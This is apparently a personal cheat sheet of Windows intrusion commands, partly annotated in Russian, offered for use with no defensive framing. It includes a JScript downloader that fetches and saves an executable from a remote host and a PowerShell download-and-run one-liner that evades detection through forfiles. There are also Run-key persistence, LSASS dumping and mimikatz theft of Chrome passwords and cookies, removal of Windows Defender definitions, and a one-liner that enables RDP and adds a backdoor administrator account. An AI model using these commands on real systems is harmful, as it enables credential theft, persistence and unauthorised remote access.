
<p align="center">
  <body>
    <img src="2zHQ.gif" width="500" height="300">
  </body>
</p>

https://github.com/jreegun/Researches/tree/master/Exe%20Sideloading
https://youtu.be/3aZM0Rfjgy4

````
var  WinHttpReq  =  new  ActiveXObject ( "WinHttp.WinHttpRequest.5.1" ) ; 
WinHttpReq . Open ( "GET" ,  WScript . Arguments ( 0 ) ,  /*async=*/ false ) ; 
WinHttpReq . Send ( ) ; 
BinStream  =  new  ActiveXObject ( "ADODB.Stream" ) ; 
BinStream . Type  =  1 ;  BinStream . Open( ) ; 
BinStream . Write ( WinHttpReq . ResponseBody ) ; 
BinStream . SaveToFile ( "1.exe" ) ;

cscript /nologo 1.js http://192.168.1.192/Client.exe
````

````
WScript.Sleep(5000):Set objShell = WScript.CreateObject("WScript.Shell"):objShell.Run("start C:\Users\Public\putty.exe"), 0, True
````

````
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /f /v WinUpdater /t REG_SZ /d "%TEMP%\wncat.vbs"
````

````
aHR0cHM6Ly9zZWMubm1hc2suY24vYXJ0aWNsZV9jb250ZW50P2FfaWQ9YWQ1ZWI3NzQ1NDMxYzk4YzRiN2QxZWYyNzc0ZjI2NGI=

````
Анализируйте запросы ARP для определения взаимодействующих хостов и устаревших конфигураций сетевых адресов (SNAC)
https://github.com/arch4ngel/eavesarp


## make proxy in target PC

https://www.youtube.com/watch?v=ghZ8XK9zEfI<br>
proxy UP &
````
vim /etc/proxychains4.conf
proxychains4 nmap -A -F -sT -Pn 10.10.10.1/24 > nmap_res.txt
````


````
procdump.exe -accepteula -ma lsass.exe lsass.dmp
sekurlsa::minidump lsass.dmpsekurlsa::dpapi

````
## Mimikatz Chrome-dump

````
mimikatz dpapi::chrome /in:"%localappdata%\Google\Chrome\User Data\Default\Login Data" /unprotectbeacon> mimikatz dpapi::chrome /in:"%localappdata%\Google\Chrome\User Data\Default\Cookies" /unprotect
````
### Chrome cookies

````
 dpapi::chrome /in:"%localappdata%GoogleChromeUser DataDefaultCookies" /unprotect
````



## Download with Powershell

https://blog.jourdant.me/post/3-ways-to-download-files-with-powershell

https://adamtheautomator.com/powershell-download-file/


````
Invoke-WebRequest -Uri $url -OutFile $output
````

````
Import-Module BitsTransfer
Start-BitsTransfer -Source $url -Destination $output
````

bYpASS

https://github.com/tokyoneon/Chimera



````
powershell.exe iwr [URL] -o C:\Users\Public\[NAME].exe; forfiles.exe /p c:\windows\system32 /m svchost.exe /c C:\Users\Public\[NAME]; timeout 2; del C:\Users\Public\[NAME].exe
````
````
https://cloud.mail.ru/public/yp5y/tod8RWQqv
````
````
https://book.hacktricks.xyz/windows/basic-cmd-for-pentesters

посмотреть процессы:

tasklist /V
tasklist /SVC

посомтреть АВ\

WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
sc query windefend

удалить правила для ДЕФ

"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All

посмотреть установленные программы

reg query HKEY_LOCAL_MACHINE\SOFTWARE

ПОРТЫ открытые:

netstat -ano

порты для программ:
netsh firewall show state
netsh firewall show config


включить РДП

reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
netsh firewall add portopening TCP 3389 "Remote Desktop"
::netsh firewall set service remotedesktop enable #I found that this line is not needed
::sc config TermService start= auto #I found that this line is not needed
::net start Termservice #I found that this line is not needed


net user hacker PASS /add & net localgroup administrators hacker /add & net localgroup "Remote Desktop Users" hacker /add & reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f & reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fAllowToGetHelp /t REG_DWORD /d 1 /f & netsh firewall add portopening TCP 3389 "Remote Desktop" & netsh firewall set service remoteadmin enable

Авто загрузка управление

- https://www.thewindowsclub.com/manage-startup-items-windows-8

- https://www.techsupportall.com/how-to-disable-startup-programs-in-windows-10/#method4

-= https://community.spiceworks.com/topic/2140905-disabling-windows-startup-services-through-command-prompt

++ https://github.com/Faustvii/StartupManager
````
https://zer1t0.gitlab.io/posts/attacking_ad/
